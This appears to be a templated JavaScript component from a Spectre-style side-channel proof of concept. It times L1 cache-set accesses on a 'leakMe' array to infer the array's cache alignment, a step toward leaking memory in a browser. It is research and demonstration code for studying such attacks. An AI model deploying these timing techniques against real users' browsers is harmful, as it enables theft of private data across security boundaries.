{#
Copyright 2021 Google LLC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
#}

// We access the "leakMe" array at incremental offsets and measure the hits
// to the l1 cache sets using our L1Timer.
// The results are stored in a 2-dimensional array.
// After collecting the data, find consecutive runs of cache hits, that
// transition from one cache set to the next.

const accessLeakMeArgs = new Uint32Array([0]);
function accessLeakMe(trash) {
  const offset = accessLeakMeArgs[0] | 0;
  return leakMe[offset+trash];
}

const leakMeTimer = new L1Timer(accessLeakMe);

function leakMeTestSet(offset, set) {
  accessLeakMeArgs[0] = offset;
  return leakMeTimer.timeCacheSet(set) > {{ cache_threshold }};
}

const elementSize = 4;
const elementsPerCacheLine = CACHE_LINE_SZ/elementSize;
const testElementCount = {{ measurements }};
const testReps = {{ measurement_reps }};

const cacheHits = new Array(testElementCount);
for (let i = 0; i < cacheHits.length; i++) {
  cacheHits[i] = new Array(CACHE_LINES_PER_PAGE);
  for (let j = 0; j < cacheHits[i].length; j++) {
    cacheHits[i][j] = 0;
  }
}

for (let i = 0; i < testReps; i++) {
  for (let set = 0; set < CACHE_LINES_PER_PAGE; set++) {
    for (let elementIndex = 0; elementIndex < testElementCount; elementIndex++) {
      if (leakMeTestSet(elementIndex, set)) {
        cacheHits[elementIndex][set] += 1;
      }
    }
  }
}

function previousCacheSet(cacheSet) {
  return (CACHE_LINES_PER_PAGE+cacheSet-1) % CACHE_LINES_PER_PAGE;
}

// Find all clear transitions from one cache set to the next.
// I.e. it should look like:
//   hit  | miss
//   -----+-----
//   miss | hit
function* findTransitions() {
  let offset = elementsPerCacheLine;
  // need at least 16 elements to the bottom
  while (offset <= cacheHits.length - elementsPerCacheLine) {
    for (let cacheSet = 0; cacheSet < CACHE_LINES_PER_PAGE; cacheSet++) {
      const prevCacheSet = previousCacheSet(cacheSet);
      if (cacheHits[offset][cacheSet] != testReps) continue;
      if (cacheHits[offset-1][prevCacheSet] != testReps) continue;
      if (cacheHits[offset-1][cacheSet] != 0) continue;
      if (cacheHits[offset][prevCacheSet] != 0) continue;
      yield [offset, cacheSet];
    }
    offset++;
  }
}

// The algorithm is very simple, try to find runs of cache set hit that
// transition from one cache set to the next. I.e. if we iterate over the array
// elements, we expect 16 hits on cacheSet n, followed by 16 hits on n+1.
function inferCacheAlignment(falsePositiveThreshold, falseNegativeThreshold) {
  for (const [transitionOffset, transitionCacheSet] of findTransitions()) {
    const prevCacheSet = previousCacheSet(transitionCacheSet);
    const startOffset = transitionOffset - elementsPerCacheLine;
    const maxHitCount = 2 * elementsPerCacheLine * testReps;
    let hitCount = 0;
    let wrongHitCount = 0;
    for (let i = 0; i < elementsPerCacheLine; i++) {
      hitCount += cacheHits[startOffset+i][prevCacheSet];
      hitCount += cacheHits[transitionOffset+i][transitionCacheSet];
      wrongHitCount += cacheHits[startOffset+i][transitionCacheSet];
      wrongHitCount += cacheHits[transitionOffset+i][prevCacheSet];
    }
    if (hitCount/maxHitCount >= (1-falseNegativeThreshold)
      && wrongHitCount/maxHitCount < falsePositiveThreshold) {
      return [true, startOffset, prevCacheSet];
    }
  }
  return [false, -1, -1];
}

const [leakSuccess, alignedIndex, inferredCacheSet] = inferCacheAlignment(0.20, 0.05);
